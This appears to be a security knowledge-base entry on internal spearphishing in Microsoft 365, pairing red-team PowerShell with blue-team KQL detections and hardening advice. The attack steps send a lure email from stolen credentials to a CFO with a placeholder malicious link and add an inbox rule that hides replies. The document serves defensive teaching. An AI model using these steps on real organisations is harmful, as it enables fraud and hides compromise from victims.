# [IA-PHISH-005]: Internal Spearphishing Campaigns

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | IA-PHISH-005 |
| **MITRE ATT&CK v18.1** | [Internal Spearphishing (T1534)](https://attack.mitre.org/techniques/T1534/) |
| **Tactic** | Initial Access / Lateral Movement |
| **Platforms** | M365 / Exchange Online |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Using a compromised internal account to send phishing emails to other employees within the same organization. Because the email originates internally, it automatically bypasses SPF/DKIM/DMARC checks and most standard Secure Email Gateway (SEG) filters.
- **Attack Surface:** Exchange Online / Outlook Web Access (OWA).
- **Business Impact:** **Rapid Lateral Movement**. Employees have a high level of implicit trust in emails from colleagues ("See attached invoice from Finance"), leading to very high click rates.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Access to at least one compromised mailbox (User credentials).
- **Tools:**
    - [Ruler](https://github.com/sensepost/ruler) (legacy, still works in some configs)
    - PowerAutomate (Flows)
    - Standard Outlook Client / OWA
    - PowerShell (`Send-MailMessage`)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Enumeration**
Identify high-value targets (Finance, HR, C-Suite) via the Global Address List (GAL).

```powershell
# If you have AD access
Get-ADUser -Filter * -Properties Title | Where-Object {$_.Title -like "*Finance*"}
```

**Step 2: Exploitation (Sending the Phish)**
Send email from the compromised user's context.

```powershell
# Via PowerShell if SMTP Auth is enabled (often is for legacy support)
$cred = Get-Credential # Enter compromised creds
Send-MailMessage `
    -From "compromised.user@target-corp.com" `
    -To "cfo@target-corp.com" `
    -Subject "URGENT: Q4 Invoice Discrepancy" `
    -Body "Please review the attached mismatch before EOD: <a href='http://malicious-link.com'>Invoice_Q4.pdf</a>" `
    -SmtpServer "smtp.office365.com" `
    -Credential $cred `
    -UseSsl `
    -Port 587
```

**Step 3: Obfuscation (Inbox Rules)**
Create an inbox rule to delete replies or move them to a hidden folder, so the compromised user doesn't see the "What is this?" responses.

```powershell
# Via Graph API or Outlook Rules
New-InboxRule -Name "Hide_Replies" -SubjectContainsWords "Invoice" -MoveToFolder "Junk Email"
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Microsoft Defender for Office 365
*   Enable **"Internal impersonation"** protection in Anti-Phishing policies.
*   Configure **Safe Links** for internal messages (often disabled by default for performance).

#### 5.2 Microsoft Sentinel (KQL)
Detect bursts of emails from a single internal sender to multiple recipients containing URL patterns not previously seen.

```kusto
EmailEvents
| where EmailDirection == "Inbound" // Internal-to-Internal is often logged as Inbound or Intra-org
| where SenderFromDomain == RecipientDomain
| where ThreatTypes has "Phish" or ThreatTypes has "Malware"
| summarize Count=count() by SenderFromAddress, Subject, TimeGenerated
| where Count > 10 // Threshold for mass blast
| sort by TimeGenerated desc
```

#### 5.3 Rare URL Detection
```kusto
EmailUrlInfo
| where UrlLocation == "Body"
| join kind=inner (EmailEvents | where SenderFromDomain == RecipientDomain) on NetworkMessageId
| summarize Count=count() by UrlDomain
| where Count < 5 // New/Rare domains
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Network:** **Disable SMTP Auth** globally in the tenant (Exchange Online PowerShell: `Set-TransportConfig -SmtpClientAuthenticationDisabled $true`). Enable it only for specific service accounts that require it.
*   **Configuration:** Implement **Zero Hour Auto Purge (ZAP)** for internal messages to retroactively remove malicious emails after delivery.
*   **MFA:** Enforce MFA for *all* users. Internal phishing relies on the initial compromise of one account.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-VALID-001] (Valid Accounts - initial compromise)
> **Next Logical Step:** [IA-PHISH-006] (EWS Impersonation for more stealth)
